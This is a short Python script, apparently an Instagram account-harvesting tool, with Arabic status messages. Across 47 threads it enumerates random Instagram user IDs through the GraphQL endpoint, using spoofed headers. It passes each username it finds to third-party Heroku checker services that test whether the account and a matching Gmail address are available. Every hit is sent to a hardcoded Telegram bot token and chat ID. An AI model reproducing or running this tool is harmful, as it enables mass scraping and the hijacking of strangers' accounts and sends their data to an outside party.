import requests,instaloader,os,httpx,sys
from time import time
from hashlib import md5
from user_agent import generate_user_agent
from random import randrange
from threading import Thread
ids=[]
opi,opi1=0,0
def checkgm(us):
  try:
    a = httpx.get(f"https://gmail-mhros-e438ac1b0be7.herokuapp.com/qredes/gmail/?email={us}")
    if '"status":"good"' in a.text:
        httpx.get(f"https://api.telegram.org/bot6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo/sendMessage?chat_id=749219602&text={us}")
    else:print('جوجل شغال');pass
  except:pass
def check(us):
  try:
    cc = httpx.get(f'https://api-zi-7c2fc6a6a5b2.herokuapp.com/api/instagram/zaid.k.k/v2.z.k/v1/{us}').text
    if 'OK' in cc:
        print('انستا شغال')
        checkgm(us)
    else:pass
  except:pass
def get_id():
  id=str(randrange(10070, 30975110))
  if id not in ids:
    ids.append(id)
    return id
  else:
    get_id()
def get_username():
  
  while True:
    try:
      global opi,opi1
      id=get_id()
      csrftoken = md5(str(time()).encode()).hexdigest()
      headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'dpr': '0.8',
    'origin': 'https://www.instagram.com',
    'user-agent': generate_user_agent(),
    'x-csrftoken': csrftoken,
    }
      data = {
    '__spin_b': 'trunk',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+id+'","username":"0s9s"}',
    'server_timestamps': 'true',
    'doc_id': '7666785636679494',
}
      response = httpx.post('https://www.instagram.com/graphql/query', headers=headers, data=data).json()
      username=response['data']['user']['username']
      opi1+=1
      print(username,'from:',opi1)
      check(username)
      if opi1>3000:
          httpx.get(f"https://api.telegram.org/bot6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo/sendMessage?chat_id=749219602&text=تصفير: ناجح✅")
          sys.exit()
          
    except:pass
httpx.get(f"https://api.telegram.org/bot6445458149:AAGTx7KQe8slPu2AcmCczQrbkR-_zhs7YWo/sendMessage?chat_id=749219602&text=بدأ:ناجح✅")
threads = []

for _ in range(47):
    thread =Thread(target=get_username)
    thread.start()
    threads.append(thread)
for thread in threads:
    thread.join()
    
